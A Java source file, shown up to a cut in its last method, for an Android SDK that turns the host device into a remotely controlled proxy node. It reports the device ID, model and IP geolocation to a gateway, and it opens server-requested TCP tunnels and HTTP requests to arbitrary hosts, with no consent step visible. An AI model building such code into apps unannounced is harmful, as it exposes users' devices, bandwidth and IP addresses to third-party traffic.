package com.iploop.sdk;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.SynchronousQueue;

/**
 * IPLoop SDK with tunnel/proxy support.
 * Static API — matches production SDK pattern for reflection/DexClassLoader usage.
 *
 * Features:
 *   - WebSocket connection with auto-reconnect
 *   - IP info reporting with caching
 *   - TCP tunnel support (tunnel_open/tunnel_data/tunnel_close)
 *   - Proxy request handling (proxy_request/proxy_response)
 *   - Cooldown handling
 *
 * Usage:
 *   IPLoopSDK.init(context);
 *   IPLoopSDK.start();
 *   // ...later...
 *   IPLoopSDK.stop();
 */
public class IPLoopSDK {

    private static final String TAG = "IPLoopSDK";
    private static final String SDK_VERSION = "2.0";
    private static final String DEFAULT_SERVER = "wss://gateway.iploop.io:9443/ws";
    private static final int KEEPALIVE_INTERVAL_MS = 55_000;
    private static final int RECONNECT_BASE_MS = 2_000;
    private static final int RECONNECT_MAX_MS = 300_000;
    private static final int SOCKET_TIMEOUT_MS = 90_000;
    private static final int CONNECT_TIMEOUT_MS = 15_000;
    private static final int TUNNEL_CONNECT_TIMEOUT_MS = 10_000;
    private static final int TUNNEL_BUFFER_SIZE = 32768; // 32KB chunks for tunnel data

    private static String serverUrl = DEFAULT_SERVER;
    private static String nodeId;
    private static String deviceModel;
    private static Context appContext;

    private static Socket socket;
    private static InputStream inputStream;
    private static OutputStream outputStream;
    private static final AtomicBoolean running = new AtomicBoolean(false);
    private static volatile boolean connected = false;
    private static int reconnectAttempt = 0;
    private static final AtomicLong totalConnections = new AtomicLong(0);
    private static final AtomicLong totalDisconnections = new AtomicLong(0);
    private static long connectedSince = 0;

    // IP info cache
    private static String cachedIP = null;
    private static String cachedIPInfoJson = null;
    private static long lastIPCheckTime = 0;
    private static final long IP_CHECK_COOLDOWN_MS = 3600000; // 1 hour

    // Active tunnels: tunnelId -> TunnelConnection
    private static final ConcurrentHashMap<String, TunnelConnection> activeTunnels = new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<String, Long> recentlyClosedTunnels = new ConcurrentHashMap<>();

    private static ScheduledExecutorService scheduler;
    private static ExecutorService tunnelExecutor;
    private static ScheduledFuture<?> keepaliveFuture;
    private static Thread connectionThread;

    /**
     * Represents an active TCP tunnel through this node.
     */
    private static class TunnelConnection {
        final String tunnelId;
        final String host;
        final int port;
        Socket socket;
        InputStream in;
        OutputStream out;
        volatile boolean closed = false;

        TunnelConnection(String tunnelId, String host, int port) {
            this.tunnelId = tunnelId;
            this.host = host;
            this.port = port;
        }

        void close() {
            if (closed) return;
            closed = true;
            try { if (in != null) in.close(); } catch (Exception e) { /* ignore */ }
            try { if (out != null) out.close(); } catch (Exception e) { /* ignore */ }
            try { if (socket != null) socket.close(); } catch (Exception e) { /* ignore */ }
        }
    }

    /**
     * Initialize with Context. Auto-detects device ID and model.
     */
    public static void init(Context context) {
        init(context, DEFAULT_SERVER);
    }

    /**
     * Initialize with Context and custom server URL.
     */
    public static void init(Context context, String server) {
        appContext = context.getApplicationContext();
        serverUrl = server;
        nodeId = getDeviceId(appContext);
        deviceModel = Build.MODEL + " (" + Build.MANUFACTURER + ")";
        loadIPCache();
        Log.i(TAG, "Initialized. nodeId=" + nodeId + " model=" + deviceModel + " version=" + SDK_VERSION);
    }

    /**
     * Start — opens internal thread, returns immediately.
     */
    public static void start() {
        if (nodeId == null) {
            Log.e(TAG, "Not initialized. Call init(context) first.");
            return;
        }
        if (running.getAndSet(true)) {
            Log.w(TAG, "Already running.");
            return;
        }
        scheduler = Executors.newScheduledThreadPool(2);
        int cpuCores = Runtime.getRuntime().availableProcessors();
        long maxMemMB = Runtime.getRuntime().maxMemory() / (1024 * 1024);
        int poolSize = maxMemMB > 256 ? cpuCores * 4 : cpuCores * 2;
        poolSize = Math.max(8, Math.min(poolSize, 32));
        Log.i(TAG, "Tunnel pool: cores=" + cpuCores + " maxMem=" + maxMemMB + "MB poolSize=" + poolSize);
        ThreadPoolExecutor tpe = new ThreadPoolExecutor(
            2, poolSize, 10L, TimeUnit.SECONDS,
            new SynchronousQueue<Runnable>(),
            new ThreadFactory() {
                @Override
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r, "IPLoop-Tunnel-" + System.nanoTime());
                    t.setDaemon(true);
                    return t;
                }
            },
            new ThreadPoolExecutor.AbortPolicy()
        );
        tpe.allowCoreThreadTimeOut(true);
        tunnelExecutor = tpe;
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                connectionLoop();
            }
        }, "iploop-ws");
        connectionThread.setDaemon(false);
        connectionThread.start();
        Log.i(TAG, "Started. server=" + serverUrl);
    }

    /**
     * Stop and disconnect.
     */
    public static void stop() {
        running.set(false);
        closeAllTunnels();
        disconnect("stop_called");
        if (scheduler != null) scheduler.shutdownNow();
        if (tunnelExecutor != null) tunnelExecutor.shutdownNow();
        if (connectionThread != null) connectionThread.interrupt();
        Log.i(TAG, "Stopped. conns=" + totalConnections.get() + " disconns=" + totalDisconnections.get());
    }

    public static boolean isConnected() { return connected; }
    public static boolean isRunning() { return running.get(); }
    public static String getNodeId() { return nodeId; }
    public static int getActiveTunnelCount() { return activeTunnels.size(); }

    // ── Private ──

    private static String getDeviceId(Context context) {
        try {
            String id = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception e) { /* fallback */ }
        try {
            String serial = Build.SERIAL;
            if (serial != null && !"unknown".equals(serial) && !serial.isEmpty()) return serial;
        } catch (Exception e) { /* fallback */ }
        return "unknown-" + System.currentTimeMillis();
    }

    private static void connectionLoop() {
        while (running.get()) {
            try {
                connect();
                reconnectAttempt = 0;
                readLoop();
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
            }
            if (!running.get()) break;
            reconnectAttempt++;
            totalDisconnections.incrementAndGet();
            connected = false;
            closeAllTunnels();
            if (keepaliveFuture != null) { keepaliveFuture.cancel(false); keepaliveFuture = null; }

            // Check if server put us on cooldown
            long cooldownRemaining = cooldownUntil - System.currentTimeMillis();
            if (cooldownRemaining > 0) {
                Log.i(TAG, "On cooldown, sleeping " + (cooldownRemaining / 1000) + "s");
                try { Thread.sleep(cooldownRemaining); } catch (InterruptedException ie) { break; }
                cooldownUntil = 0;
            } else {
                int delay = Math.min(RECONNECT_BASE_MS * (1 << Math.min(reconnectAttempt, 10)), RECONNECT_MAX_MS);
                Log.i(TAG, "Reconnecting in " + delay + "ms (attempt #" + reconnectAttempt + ")");
                try { Thread.sleep(delay); } catch (InterruptedException ie) { break; }
            }
        }
    }

    private static void connect() throws Exception {
        URI uri = new URI(serverUrl);
        String host = uri.getHost();
        int port = uri.getPort();
        boolean ssl = "wss".equals(uri.getScheme());
        if (port == -1) port = ssl ? 443 : 80;
        String path = uri.getPath();
        if (path == null || path.isEmpty()) path = "/";

        Log.i(TAG, "Connecting to " + host + ":" + port + path + (ssl ? " (SSL)" : ""));

        if (ssl) {
            javax.net.ssl.SSLSocketFactory factory = (javax.net.ssl.SSLSocketFactory)
                javax.net.ssl.SSLSocketFactory.getDefault();
            socket = factory.createSocket();
        } else {
            socket = new Socket();
        }
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        socket.setSoTimeout(SOCKET_TIMEOUT_MS);
        socket.connect(new InetSocketAddress(host, port), CONNECT_TIMEOUT_MS);

        if (ssl) {
            ((javax.net.ssl.SSLSocket) socket).startHandshake();
        }

        inputStream = socket.getInputStream();
        outputStream = socket.getOutputStream();

        // WebSocket handshake
        byte[] keyBytes = new byte[16];
        new SecureRandom().nextBytes(keyBytes);
        String wsKey = android.util.Base64.encodeToString(keyBytes, android.util.Base64.NO_WRAP);

        String handshake = "GET " + path + " HTTP/1.1\r\n" +
                "Host: " + host + "\r\n" +
                "Upgrade: websocket\r\n" +
                "Connection: Upgrade\r\n" +
                "Sec-WebSocket-Key: " + wsKey + "\r\n" +
                "Sec-WebSocket-Version: 13\r\n" +
                "\r\n";
        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));
        outputStream.flush();

        // Read HTTP response
        String statusLine = readLine();
        if (statusLine == null || !statusLine.contains("101")) {
            throw new IOException("WebSocket handshake failed: " + statusLine);
        }
        while (true) {
            String line = readLine();
            if (line == null || line.isEmpty()) break;
        }

        connected = true;
        connectedSince = System.currentTimeMillis();
        totalConnections.incrementAndGet();
        Log.i(TAG, "Connected! (#" + totalConnections.get() + ")");

        // Send hello
        String hello = "{\"type\":\"hello\",\"node_id\":\"" + nodeId +
                "\",\"device_model\":\"" + escapeJson(deviceModel) +
                "\",\"sdk_version\":\"" + SDK_VERSION + "\"}";
        sendText(hello);
        startKeepalive();

        // Fetch and send IP info in background
        scheduler.submit(new Runnable() {
            @Override
            public void run() {
                fetchAndSendIPInfo();
            }
        });
    }

    private static String readLine() throws IOException {
        StringBuilder sb = new StringBuilder();
        int c;
        while ((c = inputStream.read()) != -1) {
            if (c == '\n') break;
            if (c != '\r') sb.append((char) c);
        }
        return c == -1 && sb.length() == 0 ? null : sb.toString();
    }

    private static void readLoop() throws Exception {
        while (running.get() && connected) {
            try {
                int b1 = inputStream.read();
                if (b1 == -1) { disconnect("eof"); return; }
                int opcode = b1 & 0x0F;
                int b2 = inputStream.read();
                if (b2 == -1) { disconnect("eof_length"); return; }
                boolean masked = (b2 & 0x80) != 0;
                long payloadLen = b2 & 0x7F;
                if (payloadLen == 126) {
                    payloadLen = ((inputStream.read() & 0xFF) << 8) | (inputStream.read() & 0xFF);
                } else if (payloadLen == 127) {
                    payloadLen = 0;
                    for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | (inputStream.read() & 0xFF);
                }
                byte[] maskKey = null;
                if (masked) { maskKey = new byte[4]; readFully(maskKey); }
                byte[] payload = new byte[(int) payloadLen];
                if (payloadLen > 0) {
                    readFully(payload);
                    if (masked) for (int i = 0; i < payload.length; i++) payload[i] ^= maskKey[i % 4];
                }
                switch (opcode) {
                    case 0x1: handleTextMessage(new String(payload, StandardCharsets.UTF_8)); break;
                    case 0x2: handleBinaryMessage(payload); break;
                    case 0x8:
                        int code = payload.length >= 2 ? ((payload[0] & 0xFF) << 8) | (payload[1] & 0xFF) : 0;
                        String reason = payload.length > 2 ? new String(payload, 2, payload.length - 2, StandardCharsets.UTF_8) : "";
                        disconnect("server_close:" + code + ":" + reason); return;
                    case 0x9: sendPong(payload); break;
                    case 0xA: break;
                }
            } catch (SocketTimeoutException e) {
                disconnect("read_timeout_" + SOCKET_TIMEOUT_MS + "ms"); return;
            } catch (IOException e) {
                disconnect("io_error: " + e.getMessage()); return;
            }
        }
    }

    private static volatile long cooldownUntil = 0;

    private static void handleTextMessage(String text) {
        try {
            if (text.contains("\"welcome\"")) {
                Log.i(TAG, "Welcome received");
            } else if (text.contains("\"keepalive_ack\"")) {
                long uptime = (System.currentTimeMillis() - connectedSince) / 1000;
                Log.d(TAG, "Keepalive ACK (uptime=" + uptime + "s)");
            } else if (text.contains("\"cooldown\"")) {
                handleCooldown(text);
            } else if (text.contains("\"tunnel_open\"")) {
                handleTunnelOpen(text);
            } else if (text.contains("\"tunnel_data\"")) {
                handleTunnelData(text);
            } else if (text.contains("\"proxy_request\"")) {
                handleProxyRequest(text);
            } else {
                Log.d(TAG, "Received: " + text.substring(0, Math.min(100, text.length())));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling message: " + e.getMessage());
        }
    }

    private static void handleCooldown(String text) {
        int retrySec = 600; // default 10 min
        try {
            int idx = text.indexOf("retry_after_sec");
            if (idx != -1) {
                String after = text.substring(idx + 17);
                StringBuilder num = new StringBuilder();
                for (char c : after.toCharArray()) {
                    if (Character.isDigit(c)) num.append(c);
                    else if (num.length() > 0) break;
                }
                if (num.length() > 0) retrySec = Integer.parseInt(num.toString());
            }
        } catch (Exception e) { /* use default */ }
        cooldownUntil = System.currentTimeMillis() + (retrySec * 1000L);
        Log.i(TAG, "Server cooldown: sleeping " + retrySec + "s");
        disconnect("server_cooldown_" + retrySec + "s");
    }

    // ── Tunnel handling ──

    /**
     * Handle tunnel_open request from server.
     * Server sends: {"type":"tunnel_open","data":{"tunnel_id":"xxx","host":"example.com","port":"443"}}
     * We connect to host:port and reply with success/failure.
     */
    private static void handleTunnelOpen(String text) {
        final String tunnelId = extractJsonString(text, "tunnel_id");
        try {
        tunnelExecutor.submit(new Runnable() {
            @Override
            public void run() {
                String host = extractJsonString(text, "host");
                String portStr = extractJsonString(text, "port");

                if (tunnelId == null || host == null || portStr == null) {
                    Log.e(TAG, "Invalid tunnel_open: missing fields");
                    return;
                }

                int port;
                try {
                    port = Integer.parseInt(portStr);
                } catch (NumberFormatException e) {
                    sendTunnelResponse(tunnelId, false, "invalid port: " + portStr);
                    return;
                }

                Log.i(TAG, "Opening tunnel " + tunnelId.substring(0, 8) + " to " + host + ":" + port);

                try {
                    Socket targetSocket = new Socket();
                    targetSocket.setTcpNoDelay(true);
                    targetSocket.setKeepAlive(true);
                    targetSocket.setSoTimeout(30000);
                    targetSocket.connect(new InetSocketAddress(host, port), TUNNEL_CONNECT_TIMEOUT_MS);

                    TunnelConnection tunnel = new TunnelConnection(tunnelId, host, port);
                    tunnel.socket = targetSocket;
                    tunnel.in = targetSocket.getInputStream();
                    tunnel.out = targetSocket.getOutputStream();
                    activeTunnels.put(tunnelId, tunnel);

                    // Send success response
                    sendTunnelResponse(tunnelId, true, null);
                    Log.i(TAG, "Tunnel " + tunnelId.substring(0, 8) + " connected to " + host + ":" + port);

                    // Start reading from target and forwarding to server
                    startTunnelReader(tunnel);

                } catch (Exception e) {
                    Log.e(TAG, "Tunnel " + tunnelId.substring(0, 8) + " failed: " + e.getMessage());
                    sendTunnelResponse(tunnelId, false, e.getMessage());
                }
            }
        });
        } catch (java.util.concurrent.RejectedExecutionException e) {
            Log.w(TAG, "Tunnel " + (tunnelId != null ? tunnelId.substring(0, 8) : "?") + " rejected: pool full");
            sendTunnelResponse(tunnelId, false, "node busy: thread pool full");
        }
    }

    /**
     * Read data from tunnel target and forward to server as tunnel_data messages.
     */
    private static void startTunnelReader(final TunnelConnection tunnel) {
        tunnelExecutor.submit(new Runnable() {
            @Override
            public void run() {
                byte[] buffer = new byte[TUNNEL_BUFFER_SIZE];
                try {
                    while (!tunnel.closed && connected && running.get()) {
                        int n = tunnel.in.read(buffer);
                        if (n == -1) {
                            Log.i(TAG, "Tunnel " + tunnel.tunnelId.substring(0, 8) + " target EOF");
                            break;
                        }
                        if (n > 0) {
                            // Send as binary frame — no base64 overhead
                            byte[] chunk = new byte[n];
                            System.arraycopy(buffer, 0, chunk, 0, n);
                            sendBinaryTunnelData(tunnel.tunnelId, chunk, false);
                        }
                    }
                } catch (SocketTimeoutException e) {
                    Log.d(TAG, "Tunnel " + tunnel.tunnelId.substring(0, 8) + " read timeout");
                } catch (IOException e) {
                    if (!tunnel.closed) {
                        Log.e(TAG, "Tunnel " + tunnel.tunnelId.substring(0, 8) + " read error: " + e.getMessage());
                    }
                } finally {
                    // Send binary EOF to server
                    try {
                        sendBinaryTunnelData(tunnel.tunnelId, null, true);
                    } catch (Exception e) { /* ignore */ }
                    closeTunnel(tunnel.tunnelId);
                }
            }
        });
    }

    /**
     * Handle tunnel_data from server — write data to the target socket.
     * Server sends: {"type":"tunnel_data","data":{"tunnel_id":"xxx","data":"base64...","eof":false}}
     */
    private static void handleTunnelData(String text) {
        String tunnelId = extractJsonString(text, "tunnel_id");
        if (tunnelId == null) return;

        TunnelConnection tunnel = activeTunnels.get(tunnelId);
        if (tunnel == null) {
            // Suppress warning for recently closed tunnels (race condition)
            if (recentlyClosedTunnels.containsKey(tunnelId)) return;
            Log.w(TAG, "Data for unknown tunnel: " + tunnelId.substring(0, Math.min(8, tunnelId.length())));
            return;
        }

        // Check EOF
        if (text.contains("\"eof\":true") || text.contains("\"eof\": true")) {
            Log.i(TAG, "Tunnel " + tunnelId.substring(0, 8) + " received EOF from server");
            closeTunnel(tunnelId);
            return;
        }

        // Extract base64 data and write to target
        String b64Data = extractJsonString(text, "data");
        if (b64Data != null && !b64Data.isEmpty()) {
            try {
                byte[] decoded = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
                tunnel.out.write(decoded);
                tunnel.out.flush();
            } catch (Exception e) {
                Log.e(TAG, "Tunnel " + tunnelId.substring(0, 8) + " write error: " + e.getMessage());
                closeTunnel(tunnelId);
            }
        }
    }

    /**
     * Send tunnel_response to server.
     */
    private static void sendTunnelResponse(String tunnelId, boolean success, String error) {
        try {
            String msg;
            if (success) {
                msg = "{\"type\":\"tunnel_response\",\"data\":{\"tunnel_id\":\"" + tunnelId +
                        "\",\"success\":true}}";
            } else {
                msg = "{\"type\":\"tunnel_response\",\"data\":{\"tunnel_id\":\"" + tunnelId +
                        "\",\"success\":false,\"error\":\"" + escapeJson(error != null ? error : "unknown") + "\"}}";
            }
            sendText(msg);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send tunnel response: " + e.getMessage());
        }
    }

    /**
     * Close a tunnel and clean up.
     */
    private static void closeTunnel(String tunnelId) {
        TunnelConnection tunnel = activeTunnels.remove(tunnelId);
        if (tunnel != null) {
            tunnel.close();
            recentlyClosedTunnels.put(tunnelId, System.currentTimeMillis());
            Log.i(TAG, "Tunnel " + tunnelId.substring(0, 8) + " closed. Active: " + activeTunnels.size());
            // Clean old entries after 10s
            long now = System.currentTimeMillis();
            Iterator<Map.Entry<String, Long>> it = recentlyClosedTunnels.entrySet().iterator();
            while (it.hasNext()) {
                if (now - it.next().getValue() > 10000) it.remove();
            }
        }
    }

    /**
     * Close all active tunnels (called on disconnect/stop).
     */
    private static void closeAllTunnels() {
        int count = activeTunnels.size();
        // Use keys() enumeration instead of keySet() — keySet() returns KeySetView on API 24+
        // which crashes on API 23 and below with NoSuchMethodError
        java.util.Enumeration<String> keys = activeTunnels.keys();
        while (keys.hasMoreElements()) {
            String tunnelId = keys.nextElement();
            TunnelConnection tunnel = activeTunnels.remove(tunnelId);
            if (tunnel != null) tunnel.close();
        }
        if (count > 0) Log.i(TAG, "Closed all " + count + " tunnels");
    }

    // ── Proxy request handling ──

    /**
     * Handle proxy_request from server — make HTTP request and return response.
     * Server sends: {"type":"proxy_request","data":{"request_id":"xxx","host":"example.com","port":"80",
     *               "method":"GET","url":"http://example.com/","headers":{...},"body":"base64","timeout_ms":30000}}
     */
    private static void handleProxyRequest(String text) {
        final String requestId = extractJsonString(text, "request_id");
        try {
        tunnelExecutor.submit(new Runnable() {
            @Override
            public void run() {
                if (requestId == null) return;

                String urlStr = extractJsonString(text, "url");
                String method = extractJsonString(text, "method");
                if (method == null) method = "GET";

                long startMs = System.currentTimeMillis();

                try {
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod(method.toUpperCase());
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(30000);
                    conn.setInstanceFollowRedirects(true);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36");

                    // Read body if present
                    String bodyB64 = extractJsonString(text, "body");
                    if (bodyB64 != null && !bodyB64.isEmpty()) {
                        conn.setDoOutput(true);
                        byte[] bodyBytes = android.util.Base64.decode(bodyB64, android.util.Base64.DEFAULT);
                        conn.getOutputStream().write(bodyBytes);
                    }

                    int statusCode = conn.getResponseCode();
                    InputStream is = statusCode >= 400 ? conn.getErrorStream() : conn.getInputStream();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    int maxBody = 1048576; // 1MB max response body
                    if (is != null) {
                        byte[] buf = new byte[8192];
                        int n;
                        int total = 0;
                        while ((n = is.read(buf)) != -1 && total < maxBody) {
                            bos.write(buf, 0, n);
                            total += n;
                        }
                        is.close();
                    }
                    conn.disconnect();

                    String respB64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP);
                    long latency = System.currentTimeMillis() - startMs;

                    String resp = "{\"type\":\"proxy_response\",\"data\":{\"request_id\":\"" + requestId +
                            "\",\"success\":true,\"status_code\":" + statusCode +
                            ",\"body\":\"" + respB64 +
                            "\",\"bytes_read\":" + bos.size() +
                            ",\"latency_ms\":" + latency + "}}";
                    sendText(resp);
                    Log.i(TAG, "Proxy " + requestId.substring(0, 8) + " → " + statusCode + " (" + latency + "ms, " + bos.size() + "B)");

                } catch (Exception e) {
                    long latency = System.currentTimeMillis() - startMs;
                    try {
                        String resp = "{\"type\":\"proxy_response\",\"data\":{\"request_id\":\"" + requestId +
                                "\",\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) +
                                "\",\"latency_ms\":" + latency + "}}";
                        sendText(resp);
                    } catch (Exception e2) { /* ignore */ }
                    Log.e(TAG, "Proxy " + requestId.substring(0, 8) + " failed: " + e.getMessage());
                }
            }
        });
        } catch (java.util.concurrent.RejectedExecutionException e) {
            Log.w(TAG, "Proxy " + (requestId != null ? requestId.substring(0, 8) : "?") + " rejected: pool full");
            try {
                String resp = "{\"type\":\"proxy_response\",\"data\":{\"request_id\":\"" + requestId +
                        "\",\"success\":false,\"error\":\"node busy: thread pool full\",\"latency_ms\":0}}";
                sendText(resp);
            } catch (Exception e2) { /* ignore */ }
        }
    }

    // ── IP info cache persistence ──

    private static final String PREFS_NAME = "iploop_sdk_cache";

    private static void loadIPCache() {
        try {
            SharedPreferences prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            cachedIP = prefs.getString("cached_ip", null);
            cachedIPInfoJson = prefs.getString("cached_ip_info", null);
            lastIPCheckTime = prefs.getLong("last_ip_check", 0);
            if (cachedIP != null) {
                Log.i(TAG, "Loaded IP cache: " + cachedIP + " (age=" + ((System.currentTimeMillis() - lastIPCheckTime) / 1000) + "s)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to load IP cache: " + e.getMessage());
        }
    }

    private static void saveIPCache() {
        try {
            SharedPreferences prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit()
                .putString("cached_ip", cachedIP)
                .putString("cached_ip_info", cachedIPInfoJson)
                .putLong("last_ip_check", lastIPCheckTime)
                .apply();
        } catch (Exception e) {
            Log.e(TAG, "Failed to save IP cache: " + e.getMessage());
        }
    }

    // ── IP info ──

    private static void fetchAndSendIPInfo() {
        try {
            long now = System.currentTimeMillis();
            if (now - lastIPCheckTime < IP_CHECK_COOLDOWN_MS && cachedIPInfoJson != null) {
                Log.i(TAG, "IP check cooldown active, sending cached info");
                if (connected && running.get() && cachedIP != null) {
                    String msg = "{\"type\":\"ip_info\",\"node_id\":\"" + nodeId +
                                 "\",\"device_id\":\"" + escapeJson(nodeId) +
                                 "\",\"device_model\":\"" + escapeJson(deviceModel) +
                                 "\",\"ip\":\"" + escapeJson(cachedIP) +
                                 "\",\"ip_info\":" + cachedIPInfoJson + "}";
                    sendText(msg);
                }
                return;
            }

            long ipStart = System.currentTimeMillis();
            String ip = httpGet("https://ip2location.io/ip").trim();
            long ipFetchMs = System.currentTimeMillis() - ipStart;
            if (ip.isEmpty() || ip.length() > 45) {
                Log.e(TAG, "Failed to get IP");
                return;
            }
            Log.i(TAG, "Got IP: " + ip + " (" + ipFetchMs + "ms)");
            lastIPCheckTime = now;

            if (ip.equals(cachedIP) && cachedIPInfoJson != null) {
                Log.i(TAG, "IP unchanged (" + ip + "), using cached info");
                if (connected && running.get()) {
                    String msg = "{\"type\":\"ip_info\",\"node_id\":\"" + nodeId +
                                 "\",\"device_id\":\"" + escapeJson(nodeId) +
                                 "\",\"device_model\":\"" + escapeJson(deviceModel) +
                                 "\",\"ip\":\"" + escapeJson(ip) +
                                 "\",\"ip_fetch_ms\":" + ipFetchMs +
                                 ",\"info_fetch_ms\":0" +
                                 ",\"ip_info\":" + cachedIPInfoJson + "}";
                    sendText(msg);
                }
                return;
            }

            Log.i(TAG, "IP changed or first fetch, querying ip2location...");
            long infoStart = System.currentTimeMillis();
            String page = httpGet("https://www.ip2location.com/" + ip);
            long infoFetchMs = System.currentTimeMillis() - infoStart;
            
            String marker = "language-json\">";
            int start = page.indexOf(marker);
            if (start == -1) { Log.e(TAG, "Could not find language-json in page"); return; }
            start += marker.length();
            int end = page.indexOf("</code>", start);
            if (end == -1) { Log.e(TAG, "Could not find closing </code>"); return; }
            String ipInfoJson = page.substring(start, end).trim()
                    .replace("&quot;", "\"").replace("&amp;", "&")
                    .replace("&lt;", "<").replace("&gt;", ">").replace("&#39;", "'");

            Log.i(TAG, "Got IP info (" + infoFetchMs + "ms)");

            cachedIP = ip;
            cachedIPInfoJson = ipInfoJson;
            saveIPCache();

            if (connected && running.get()) {
                String msg = "{\"type\":\"ip_info\",\"node_id\":\"" + nodeId +
                             "\",\"device_id\":\"" + escapeJson(nodeId) +
                             "\",\"device_model\":\"" + escapeJson(deviceModel) +
                             "\",\"ip\":\"" + escapeJson(ip) +
                             "\",\"ip_fetch_ms\":" + ipFetchMs +
                             ",\"info_fetch_ms\":" + infoFetchMs +
                             ",\"ip_info\":" + ipInfoJson + "}";
                sendText(msg);
                Log.i(TAG, "Sent IP info to server");
            }
        } catch (Exception e) {
            Log.e(TAG, "IP info fetch failed: " + e.getMessage());
        }
    }

    private static String httpGet(String urlStr) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(15000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setInstanceFollowRedirects(true);
        
        int code = conn.getResponseCode();
        if (code != 200) throw new IOException("HTTP " + code);
        
        InputStream is = conn.getInputStream();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
        is.close();
        conn.disconnect();
        return bos.toString("UTF-8");
    }

    // ── WebSocket framing ──

    private static void startKeepalive() {
        if (keepaliveFuture != null) keepaliveFuture.cancel(false);
        keepaliveFuture = scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                if (connected && running.get()) {
                    try {
                        long uptime = (System.currentTimeMillis() - connectedSince) / 1000;
                        int tunnels = activeTunnels.size();
                        sendText("{\"type\":\"keepalive\",\"uptime_sec\":" + uptime +
                                ",\"active_tunnels\":" + tunnels + "}");
                    } catch (Exception e) { Log.e(TAG, "Keepalive failed: " + e.getMessage()); }
                }
            }
        }, KEEPALIVE_INTERVAL_MS, KEEPALIVE_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }

    private static void disconnect(String reason) {
        if (!connected) return;
        connected = false;
        long duration = (System.currentTimeMillis() - connectedSince) / 1000;
        Log.i(TAG, "Disconnected: " + reason + " (connected " + duration + "s, tunnels=" + activeTunnels.size() + ")");
        try {
            if (socket != null && !socket.isClosed()) {
                sendFrame(0x8, new byte[]{0x03, (byte) 0xE8});
                socket.close();
            }
        } catch (Exception e) { /* ignore */ }
    }

    // ── Binary tunnel protocol ──

    /**
     * Handle binary WebSocket frame (opcode 0x2).
     * Format: [36 bytes tunnel_id][1 byte flags: 0x00=data, 0x01=EOF][N bytes payload]
     */
    private static void handleBinaryMessage(byte[] frame) {
        if (frame.length < 37) return;

        String tunnelId = new String(frame, 0, 36, StandardCharsets.UTF_8).trim();
        boolean eof = frame[36] == 0x01;

        if (eof) {
            Log.i(TAG, "Tunnel " + tunnelId.substring(0, Math.min(8, tunnelId.length())) + " received binary EOF from server");
            closeTunnel(tunnelId);
            return;
        }

        TunnelConnection tunnel = activeTunnels.get(tunnelId);
        if (tunnel == null) {
            if (recentlyClosedTunnels.containsKey(tunnelId)) return;
            Log.w(TAG, "Binary data for unknown tunnel: " + tunnelId.substring(0, Math.min(8, tunnelId.length())));
            return;
        }

        // Write raw bytes directly to target socket — no base64 decode needed
        byte[] data = new byte[frame.length - 37];
        System.arraycopy(frame, 37, data, 0, data.length);

        try {
            tunnel.out.write(data);
            tunnel.out.flush();
        } catch (IOException e) {
            Log.e(TAG, "Tunnel " + tunnelId.substring(0, 8) + " write error: " + e.getMessage());
            closeTunnel(tunnelId);
        }
    }

    /**
     * Send binary tunnel data frame: [36 bytes tunnel_id][1 byte flags][N bytes data]
     */
    private static void sendBinaryTunnelData(String tunnelId, byte[] data, boolean eof) throws IOException {
        byte[] idBytes = tunnelId.getBytes(StandardCharsets.UTF_8);
        byte[] frame = new byte[37 + (data != null ? data.length : 0)];
        // Pad tunnel ID to 36 bytes
        System.arraycopy(idBytes, 0, frame, 0, Math.min(idBytes.length, 36));
        frame[36] = eof ? (byte) 0x01 : (byte) 0x00;
        if (data != null && data.length > 0) {
            System.arraycopy(data, 0, frame, 37, data.length);
        }
        sendFrame(0x2, frame); // opcode 0x2 = binary
    }

    private static void sendText(String text) throws IOException {
        sendFrame(0x1, text.getBytes(StandardCharsets.UTF_8));
    }

    private static void sendPong(byte[] payload) throws IOException {
        sendFrame(0xA, payload);
    }

    private static void sendFrame(int opcode, byte[] payload) throws IOException {
        if (outputStream == null) return;
        synchronized (IPLoopSDK.class) {
            byte[] mask = new byte[4];
            new SecureRandom().nextBytes(mask);
            outputStream.write(0x80 | opcode);
            int len = payload.length;
            if (len < 126) outputStream.write(0x80 | len);
            else if (len < 65536) { outputStream.write(0x80 | 126); outputStream.write((len >> 8) & 0xFF); outputStream.write(len & 0xFF); }
